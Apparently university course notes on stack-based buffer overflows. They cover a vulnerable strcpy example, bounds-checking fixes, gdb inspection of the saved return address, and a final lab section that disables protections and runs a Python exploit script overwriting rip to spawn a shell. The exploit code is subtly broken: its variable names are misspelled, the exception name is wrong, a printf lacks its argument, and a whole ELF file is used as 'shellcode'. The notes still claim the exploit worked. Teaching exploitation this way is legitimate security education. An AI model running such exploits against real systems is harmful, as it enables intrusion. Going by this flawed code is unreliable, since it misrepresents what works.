# Buffer Overflows.

**Buffer overflow** happens when a program writes an unrestricted amount of data
to a **buffer**, a contiguous space in memory) of a given size. If more data is
written to the buffer than is allowed, then the buffer **overflows**, and
adjacent memory is overwritten with the overflowed data. For example, this kind
of programming error happens when a programmer declares an array of, say, size $$16$$ 
but writes $$32$$ bytes to the array. Some languages prevent this kind of error
by providing automatic bounds checking, however `C` does not. `C` will not bother
to check if the array will be able to hold the amount of data written to it,
which makes `C` programs vulnerable to buffer overflows, and requires that a
programmer be on the look out for these errors. Consider the following code. We
compile it and run it with a string of $$12$$ bytes.

```c
#include<string.h>
#include<stdio.h>

void copy(char*);

int main(int argc, char* argv[]){

    copy(argv[1]);

    printf("Program returned 0.\n");

    return 0;
}

void copy(char* str){
    char buffer[16];

    strcpy(buffer, str);
    printf("%s\n", buffer);

    return;
}
```

```bash
~/ccom4086/ > gcc -g -o vuln stringBufOver.c
~/ccom4086/ > ./vuln HelloWorld
HelloWorld
Program returned 0.
~/ccom4086/ >
```
 However, if we run it with a string of $$26$$ bytes, say, the entire English
 alphabet, we get a segmentation violation:

 ```bash
~/ccom4086/ >  ./vuln abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz
*** stack smashing detected ***: terminated
zsh: abort (core dumped)  ./vuln abcdefghijklmnopqrstuvwxyz
~/ccom4086/ >
 ```

In fact it tells us that it detected **stack smashing**, which occurs when we
overflow a buffer on the stack into the adjacent variables in the stack frame.
Notice that since we declare `buf` in `copy()` without declaring it `static`,
that it resides on the stack. In this case, we call this type of buffer overflow
a **stack based buffer overflow**.

Detecting stack smashing is a security feature implemented on modern compilers
that helps prevent buffer overflows. As soon as one is detected, the program is
terminated. This helps prevent hackers from exploiting the program. We can turn
this feature off with the `-fno-stack-protector` flag, compiling with this flag
and running `vuln` gives us:

```bash
~/ccom4086/ > gcc -g -fno-stack-protector -o vuln stringBufOver.c
~/ccom4086/ > ./vuln abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz
zsh: segmentation fault (core dumped)  ./vuln abcdefghijklmnopqrstuvwxyz
~/ccom4086/ >
```

Buffer overflows have been around since the early days of computers, and are a
classic vulnerability that hackers exploit to gain control over a program.
Despite their age, they still persist today and have allowed for the
exploitation of modern programs. The 2011 [CVE-2011-1266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1266) 
vulnerability in the vector markup language (VML) for Internet Explorer was
cause by a buffer overflow vulnerability.

## Bounds Checking and Avoiding Buffer Overflows.

A large buffer will naturally overflow into other variables, and if the overflow
is significant, it will crash the program, causing a segmentation violation.
This happens because the overflow overwrites the return address, and the
resultant value will be treated as an area in memory that has not been
allocated.

A simple way to fix these mistake is to implement bounds checking on the buffers
in question; or to use a programming language that does that for you. We can
hardcode some bounds checking into `copy()` so that if the string being copied
is too large, it jumps to a different instruction instead of `strcpy()`

```c

void copy(char* str){

    if(strlen(str) > 16){
        printf("Buffer too small.\n");

        return;
    }

    char buffer[16]; // declare a string of size 16.

    strcpy(buffer, str);
    printf("%s\n", buffer);

    return;
}
```

Compiling and running:

```bash
~/ccom4086/ > gcc -g -fno-stack-protector -o vuln stringBufOver.c
~/ccom4086/ > ./vuln abcdefghijklmnopqrstuvwxyz
Buffer too small.
Program returned 0.
~/ccom4086/ >
```

`C` also has specific functions restrict the amount of data you can write into
a buffer, such as `strncpy()` for example:

```c
void copy(char* str){

    char buffer[16]; // declare a string of size 16.

    strncpy(buffer, str, 16);
    printf("%s\n", buffer);

    return;
}
```

```bash
~/ccom4086/ > gcc -g -fno-stack-protector -o vuln stringBufOver.c
~/ccom4086/ > ./vuln abcdefghijklmnopqrstuvwxyz
abcdefghijklmnop
Program returned 0.
~/ccom4086/ >
```

See `man strcpy` for the details of `strncpy()`.

## A Closer Look at Buffer Overflows.

Let us run `vuln` through `gdb` to get the specifics of what is happening.
Setting a break point at `copy()` we can examine what a buffer looks like before
and after it is passed into `strcpy()` along with the string
`abcdefghijklmnopqrstuvwxyz`:

```bash
eletrico@garuda:../Examples main [!?] zsh> gdb -q vuln
Reading symbols from vuln...
(gdb) disassemble copy
Dump of assembler code for function copy:
   0x0000000000001181 <+0>:	push   %rbp
   0x0000000000001182 <+1>:	mov    %rsp,%rbp
   0x0000000000001185 <+4>:	sub    $0x20,%rsp
   0x0000000000001189 <+8>:	mov    %rdi,-0x18(%rbp)
   0x000000000000118d <+12>:	mov    -0x18(%rbp),%rdx
   0x0000000000001191 <+16>:	lea    -0x10(%rbp),%rax
   0x0000000000001195 <+20>:	mov    %rdx,%rsi
   0x0000000000001198 <+23>:	mov    %rax,%rdi
   0x000000000000119b <+26>:	call   0x1030 <strcpy@plt>
   0x00000000000011a0 <+31>:	lea    -0x10(%rbp),%rax
   0x00000000000011a4 <+35>:	mov    %rax,%rdi
   0x00000000000011a7 <+38>:	call   0x1040 <puts@plt>
   0x00000000000011ac <+43>:	nop
   0x00000000000011ad <+44>:	leave
   0x00000000000011ae <+45>:	ret
End of assembler dump.
(gdb) break copy
Breakpoint 1 at 0x118d: file stringBufOver.c, line 24.
(gdb) run abcdefghijklmnopqrstuvwxyz
Starting program: /home/eletrico/Desktop/primerSemestre2021-2022/ccom4086/ccom4086/Examples/vuln abcdefghijklmnopqrstuvwxyz

Breakpoint 1, copy (str=0x7fffffffe7d5 "abcdefghijklmnopqrstuvwxyz") at stringBufOver.c:24
24	   strcpy(buffer, str);
(gdb) print buffer
$1 = "\000\000\000\000\000\000\000\000\260QUUUU\000"
(gdb) info frame
Stack level 0, frame at 0x7fffffffe2f0:
 rip = 0x55555555518d in copy (stringBufOver.c:24); saved rip = 0x55555555516b
 called by frame at 0x7fffffffe310
 source language c.
 Arglist at 0x7fffffffe2e0, args: str=0x7fffffffe7d5 "abcdefghijklmnopqrstuvwxyz"
 Locals at 0x7fffffffe2e0, Previous frame's sp is 0x7fffffffe2f0
 Saved registers:
  rbp at 0x7fffffffe2e0, rip at 0x7fffffffe2e8
(gdb) x/16gc
Argument required (starting display address).
(gdb) x/16gc 0x7fffffffe2e8
0x7fffffffe2e8:	107 'k'	-8 '\370'
0x7fffffffe2f8:	0 '\000'	0 '\000'
0x7fffffffe308:	37 '%'	-8 '\370'
0x7fffffffe318:	100 'd'	73 'I'
0x7fffffffe328:	0 '\000'	-80 '\260'
0x7fffffffe338:	-127 '\201'	80 'P'
0x7fffffffe348:	0 '\000'	0 '\000'
0x7fffffffe358:	0 '\000'	-127 '\201'
(gdb) next
25	   printf("%s\n", buffer);
(gdb) print buffer
$2 = "abcdefghijklmnop"
(gdb) x/16gc 0x7fffffffe2e8
0x7fffffffe2e8:	121 'y'	-8 '\370'
0x7fffffffe2f8:	0 '\000'	0 '\000'
0x7fffffffe308:	37 '%'	-8 '\370'
0x7fffffffe318:	100 'd'	73 'I'
0x7fffffffe328:	0 '\000'	-80 '\260'
0x7fffffffe338:	-127 '\201'	80 'P'
0x7fffffffe348:	0 '\000'	0 '\000'
0x7fffffffe358:	0 '\000'	-127 '\201'
(gdb) continue
Continuing.
abcdefghijklmnopqrstuvwxyz

Program received signal SIGSEGV, Segmentation fault.
0x0000555555007a79 in ?? ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 18323] will be killed.

Quit anyway? (y or n) y
```

We disassemble `copy()` to get the assembly instructions for it. Notice that
right now `buffer` is empty. We also wish to find out what happens to the return
address when we overflow, so we can get its address with `info frame` and find
that `rip` is at `0x7fffffffe2e8`. Examining the return address with $$16$$
giants all character encoded we get:

```bash
(gdb) x/16gc 0x7fffffffe2e8
0x7fffffffe2e8:	107 'k'	-8 '\370'
0x7fffffffe2f8:	0 '\000'	0 '\000'
0x7fffffffe308:	37 '%'	-8 '\370'
0x7fffffffe318:	100 'd'	73 'I'
0x7fffffffe328:	0 '\000'	-80 '\260'
0x7fffffffe338:	-127 '\201'	80 'P'
0x7fffffffe348:	0 '\000'	0 '\000'
0x7fffffffe358:	0 '\000'	-127 '\201'
```

Examining in hexadecimal will just showcase where `rip` will return too after
`copy()` finishes. Continuing, we get the segmentation violation. Now notice
when we run `vuln` with `abcdeffghijklmnopqrstuvwxyz`, and printing `buffer`, we
get that it is filled with the characters `abcdefghijklmnop`. Similarly,
examining the return address again we get:

```bash
(gdb) x/16gc 0x7fffffffe2e8
0x7fffffffe2e8:	121 'y'	-8 '\370'
0x7fffffffe2f8:	0 '\000'	0 '\000'
0x7fffffffe308:	37 '%'	-8 '\370'
0x7fffffffe318:	100 'd'	73 'I'
0x7fffffffe328:	0 '\000'	-80 '\260'
0x7fffffffe338:	-127 '\201'	80 'P'
0x7fffffffe348:	0 '\000'	0 '\000'
0x7fffffffe358:	0 '\000'	-127 '\201'
```

and see that it was overwritten with `y` and `x`. Here's what the stack frame
looks like before and after:

```text
Before
---------------------------------------------------------------------------------
|-----[                ]-------[     ]------------------------------------------|
---------------------------------------------------------------------------------
After
---------------------------------------------------------------------------------
|-----[abcdefghijklmnop]qrstuvw[xyz  ]------------------------------------------|
---------------------------------------------------------------------------------
```

We can see that continuing will produces the segmentation violation.

## Exploits with Stack Based Buffer Overflow Attacks.

Now how do hackers exploit buffer overflows? The basic idea is to overflow the
buffer, but, instead of writing random data to the return address, we write the
address of some piece of code or instruction we wish to execute. This is how one
can leverage a vulnerability like this without crashing the program. One way to
implement this is to write the code we wish to execute into the buffer itself,
overflow the buffer, and write the address of the code in the buffer to the
return address. Once the code reaches the return address, the execution flow
will change, and the code in the buffer will be executed instead of what the
return address was actually supposed to return too.

Often the code we wish to execute is in the form of shellcode. That will allow
us granular control of what we want to execute. We can generate shellcode by
writing a `C` program that executes what we want to do. In this case lets try to
get a shell, so lets write:

```c
#include<stdio.h>
#include<unistd.h>

int main(){

    char* shell[2];

    shell[0] = "/bin/sh";
    shell[1] = "\0";

    execve(shell[0], shell, 0x0);

    return 0;
}
```

Compile with the `--static` to include the `execve` syscall, and run it to
verify that we get a shell.

```bash
~/ccom4086/ > gcc --static -o getshell getShell.c
~/ccom4086/ > ./getshell
sh-5.1$ whoami
ccom4086
sh-5.1$ exit
exit
~/ccom4086/ >
```

Now lets compile it with the `-S`flag to generate the assembly. Running `cat`,
we get the following assembly code:

```c
~/ccom4086/ > gcc --static -S getShell.c
~/ccom4086/ > cat getShell.s
	.file	"getShell.c"
	.text
	.section	.rodata
.LC0:
	.string	"/bin/sh"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	leaq	.LC0(%rip), %rax
	movq	%rax, -32(%rbp)
	movq	$0, -24(%rbp)
	movq	-32(%rbp), %rax
	leaq	-32(%rbp), %rcx
	movl	$0, %edx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	execve@PLT
	movl	$0, %eax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L3
	call	__stack_chk_fail@PLT
.L3:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
	.ident	"GCC: (GNU) 11.1.0"
	.section	.note.GNU-stack,"",@progbits
```

This assembly tells us the same thing the `C` code did. Spawn a shell from the
location `/bin/sh`. If one can find the shell of their choice, they can include
that in the shellcode; however `/bin/sh` is the standard in `unix` systems.

Let us work with a modified version of the program displayed below:

```c
#include<string.h>
#include<stdio.h>
#include<unistd.h>

// Copies a string to a buffer of size 16.
void copy(char*);

int main(int argc, char* argv[]){

    static char input[1024];

    while(read(STDIN_FILENO, input, 1024)>0){
        copy(input);
    }

    return 0;
}

void copy(char* str){

    char buffer[128];
    strcpy(buffer, str);
    printf("%s\n");

    return;
}
```

Since this is just an illustrative example, it would be a good idea to recompile
`stringBufOver.c` source, disabling some added security features. See [Smashing
the stack in the 21st century for an explanation](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)

```bash
~/ ccom4086/ > gcc -g -fno-stack-protector -z execstack -o vuln stringBufOver.c -D_FORTIFY_SOURCE=0
```

And run the program in a `64` bit environment with:

```bash
~/ccom4086/ > env - setarch -R ./vuln
```

Now to make use of the exploit, we need two things. The address of the buffer,
and the address of the return address. We can find both with `gdb`:

```bash
~/ccom4086/ > gdb -q vuln
Reading symbols from vuln...
(gdb) break copy
Breakpoint 1 at 0x11b0: file stringBufOver.c, line 22.
(gdb) run
Starting program: /home/ccom4086/ccom4086/vuln
Hello World!

Breakpoint 1, copy (str=0x555555558060 <input> "Hello World!\n") at stringBufOver.c:22
22	   strcpy(buffer, str);
(gdb) print &buffer
$1 = (char (*)[128]) 0x7fffffffe290
(gdb) info frame
Stack level 0, frame at 0x7fffffffe320:
 rip = 0x5555555551b0 in copy (stringBufOver.c:22); saved rip = 0x555555555179
 called by frame at 0x7fffffffe340
 source language c.
 Arglist at 0x7fffffffe310, args: str=0x555555558060 <input> "Hello World!\n"
 Locals at 0x7fffffffe310, Previous frame's sp is 0x7fffffffe320
 Saved registers:
  rbp at 0x7fffffffe310, rip at 0x7fffffffe318
(gdb) quit
A debugging session is active.

	Inferior 1 [process 7567] will be killed.

Quit anyway? (y or n) y
```

and we get `buffer` at address `0x7fffffffe290` and `rip` at address
`0x7fffffffe318`. We have now all we need for our exploit.

We can write an exploit script to make our lives easier.

```python
import os
import sys
import struct

bufferAddr = 0x7fffffffe290
retAddr = 0x7fffffffe318

shelfile = open("getshell", "rb")
shellcode = shellfile.read()

shellcode += b"A"*(retAddr-bufferAddr-len(shellcode))
shelcode += struct.pack("<Q", bufferAddr)

fp = os.fdopen(sys.stdout.fileno(), 'wb')
fp.write(shellcode)
fp.flush()

while True:
    try:
        data = sys.stdin.buffer.read1(1024)

        if not data:
            break

        fp.write(data)
        fp.flush()
    except KeyBoardInterrupt:
        break
```

We can now exploit the program:

```bash
eletrico@garuda:../Examples main [✘!?] 23s zsh> ./exploit.py | env - setarch -R ./vuln
ELF
xJ


H
)I
AT
Ƹ
A!


H=

$X




HIo
whoami
ccom4086
^C
~/ccom4086/ >
```

It worked!

This example has been relatively simple and artificail. In actual practice,
programs are compiled with added protections to make these kinds of hard to
implement. Here we disabled them just to see how the exploit works, but a keen
developer or security engineer will not give you the chance to learn how an
exploit on one of their programs will work. Running the shell above did not give
root access to the system, however permissions can be modified to allow it. Most
of the time a hacker will attempt root access into a system.

We have illustrated how buffer overflows work, and why they are dangerous. It is
important to keep them in mind and mitigate them. AN intimate knowledge with
assembly language, and with `gdb` will help with that, as much as they help with
building exploits. This section was inspired by, and meant to accompany the
following article on exploits: [Smashing the stack in the 21st century](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)

Any credit given should be given to the [author of the article]((https://thesquareplanet.com/blog/smashing-the-stack-21st-century/).
